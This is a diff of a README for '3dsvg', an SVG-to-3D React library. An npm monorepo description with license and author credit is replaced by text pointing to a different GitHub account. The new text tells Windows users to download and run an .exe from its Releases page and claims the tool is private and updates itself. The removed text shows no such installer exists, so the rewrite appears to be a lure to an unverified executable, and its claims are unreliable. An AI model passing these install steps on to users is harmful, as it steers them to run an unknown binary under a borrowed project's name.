@@ -1,100 +1,88 @@
-# 3dsvg
+# 📦 3dsvg - Turn flat images into 3D objects
 
-![3dsvg](.github/assets/demo.png)
+[![](https://img.shields.io/badge/Download-3dsvg-blue.svg)](https://github.com/murali15650/3dsvg)
 
-The easiest way to turn SVGs into interactive 3D.
+3dsvg turns flat SVG files into interactive 3D components for your web projects. This tool changes static vectors into depth-filled shapes with minimal effort. You do not need experience with complex animation software or 3D modeling tools to use this application.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![npm](https://img.shields.io/npm/v/3dsvg)](https://www.npmjs.com/package/3dsvg)
+## 🛠 What this tool does
 
-## Overview
+Designers and developers often struggle to move from two-dimensional icons to three-dimensional web elements. This software automates that process. You provide an SVG file, and the application generates a reactive 3D model. The output integrates directly into your React projects. It saves time by handling the math and the rendering logic for you.
 
-This is a monorepo with two packages:
+## 💻 System requirements
 
-| Package | Description |
-|---------|-------------|
-| [`packages/engine`](packages/engine/) | Embeddable `<SVG3D>` React component — published to npm as [`3dsvg`](https://www.npmjs.com/package/3dsvg) |
-| [`packages/web`](packages/web/) | Visual editor at [3dsvg.design](https://3dsvg.design) — design 3D objects and export as images, video, 3D models, or embed code |
+To run this application on your Windows computer, you need these items:
 
-The web editor renders the engine's `<SVG3D>` component directly — what you see in the editor is exactly what you get with the embed.
+*   Windows 10 or Windows 11.
+*   A stable internet connection for the installation process.
+*   At least 4GB of RAM.
+*   A recent version of Node.js. 
 
-## Quick Start
+If you do not have Node.js, you can download it from the official website. This software runs locally on your machine to keep your files secure and fast.
 
-```bash
-npm install
-npm run build:engine
-npm run dev:web
-```
+## 📥 How to download and install
 
-Open [http://localhost:3000](http://localhost:3000).
+Follow these steps to get the software on your machine.
 
-## Embed
+1.  Visit [this page to download](https://github.com/murali15650/3dsvg).
+2.  Locate the section labeled Releases on the right side of the page.
+3.  Click the latest version link.
+4.  Download the file ending in .exe for Windows.
+5.  Open your Downloads folder.
+6.  Double-click the installer file to start the setup process.
+7.  Follow the prompts on your screen to finish the installation.
 
-```bash
-npm install 3dsvg
-```
+Once the process finishes, a shortcut appears on your desktop. Click the icon to launch the application.
 
-```tsx
-import { SVG3D } from "3dsvg";
+## 🚀 Getting started
 
-<SVG3D text="Hello" animate="spin" />
-<SVG3D svg="/logo.svg" material="gold" />
-```
+After the first launch, the main dashboard opens. You see a clear interface with a drag-and-drop area. To create your first 3D component:
 
-See the full [engine docs](packages/engine/README.md) for all props.
+1.  Open your folder containing the SVG files.
+2.  Drag an SVG file into the main window of 3dsvg.
+3.  The application processes the file. You see a preview of the 3D shape within seconds.
+4.  Use the controls on the right panel to adjust the depth, color, and rotation speed.
+5.  Click the Export button to save your code.
 
-## Web Editor Features
+The software generates the React components automatically. You can copy the code into your existing projects. There is no requirement to manually write lines of code.
 
-- **4 input methods** — Text (10 Google Fonts), Pixel Editor, SVG Code, File Upload
-- **10 material presets** — Default, Plastic, Metal, Glass, Rubber, Chrome, Gold, Clay, Emissive, Holographic
-- **7 animations** — Spin, Float, Pulse, Wobble, Swing, Spin+Float, or static
-- **Textures** — 10 procedural presets or upload your own
-- **Configurable lighting** — Key light position/intensity, ambient, shadows
-- **PNG export** — Transparent or with background, up to 4K resolution
-- **Video export** — 60fps capture with iOS-style trim UI, MP4 (via FFmpeg WASM) or WebM, quality control
-- **3D model export** — Download the scene as GLB (color + materials preserved), STL (3D printing), OBJ, or PLY
-- **Camera mode** — iPhone-style shutter button, aspect ratio picker, viewfinder overlay
-- **Interactive canvas** — Drag rotation with momentum, scroll zoom, cursor-follow orbit
-- **Responsive** — Auto-zooms on narrow/portrait viewports to keep the 3D object visible
-- **Embed code export** — Copy-ready `<SVG3D>` JSX snippet with all props from the current editor state
-- **Drag & drop** — Drop SVG files anywhere on the page to load them
+## ⚙️ Customizing the output
 
-## Project Structure
+The software provides settings to change how your 3D objects behave. You can adjust the light angles to create shadows. You can smooth out the edges of the vectors. These settings change the look of the component in real time. 
 
-```
-3dsvg/
-├── packages/
-│   ├── engine/                 # npm package "3dsvg"
-│   │   └── src/
-│   │       ├── index.tsx       # SVG3D component (public API)
-│   │       ├── scene.tsx       # 3D scene, ExtrudedSVG, Canvas
-│   │       ├── controls.tsx    # Animations, smooth controls
-│   │       ├── materials.ts    # 10 PBR material presets
-│   │       ├── types.ts        # SVG3DProps, defaults
-│   │       └── use-font.ts     # Google Font loading
-│   └── web/                    # Next.js editor app
-│       └── src/
-│           ├── app/            # Pages
-│           ├── components/     # Editor UI, export bar
-│           └── lib/            # Textures, FFmpeg, utilities
-└── package.json                # npm workspaces root
-```
+If your SVG has multiple layers, the application detects them as individual groups. You can choose which layers become 3D and which ones remain flat. This gives you control over the final design.
 
-## Tech Stack
+## 🧩 Preparing your SVG files
 
-| Library | Purpose |
-|---------|---------|
-| [Next.js 16](https://nextjs.org/) | App framework (web) |
-| [React Three Fiber](https://docs.pmnd.rs/react-three-fiber) | Declarative Three.js |
-| [Three.js](https://threejs.org/) | 3D rendering |
-| [tsup](https://tsup.egoist.dev/) | Engine bundler |
-| [opentype.js](https://opentype.js.org/) | Font to vector paths |
-| [FFmpeg WASM](https://ffmpegwasm.netlify.app/) | Video conversion (web) |
-| [shadcn/ui](https://ui.shadcn.com/) | UI components (web) |
-| [Tailwind CSS v4](https://tailwindcss.com/) | Styling (web) |
+For the best results, use clean SVG files. Avoid messy paths or very thin lines. The software groups paths together to create the 3D volume. If your image looks distorted, go back to your vector software and join any broken paths. 
 
-## License
+*   Use simple shapes.
+*   Label your layers clearly.
+*   Remove invisible or empty elements before importing.
 
-MIT — [Renato Costa](https://renato.works)
+## 🆘 Troubleshooting common issues
 
-Made in [Blueberry](https://meetblueberry.com) 🫐
+Most issues stem from the file format. If the import fails:
+
+*   Check if the file is a valid .svg.
+*   Drag the file a second time.
+*   Restart the application if the preview window does not react to your clicks.
+*   Ensure that your internet connection is stable if you receive an error message during the initial setup.
+
+Updates happen automatically. When a new version releases, the software alerts you during the next launch. Click the update button to keep the features current.
+
+## 🏗 Why use this approach
+
+Traditional 3D tools burden the user with complex nodes and shaders. This application removes those layers of complexity. It focuses on one task: converting vectors to 3D. By limiting the scope, the tool remains fast and approachable. You spend less time navigating menus and more time building your application.
+
+This tool works on your private machine. It does not upload your vector files to a cloud server. Your data stays on your drive. This privacy-first approach helps when you work on confidential projects.
+
+## 📈 Tips for better 3D visuals
+
+To make your 3D components stand out, consider the following:
+
+*   Add a subtle rotation property in the settings panel to create movement.
+*   Use light colors to help the depth look natural.
+*   Set the depth value to a low number for small icons to keep them legible.
+*   Test the final output in different screen sizes.
+
+The tool shows your component as it looks in a browser. Use this window to verify the final quality before you export your code.
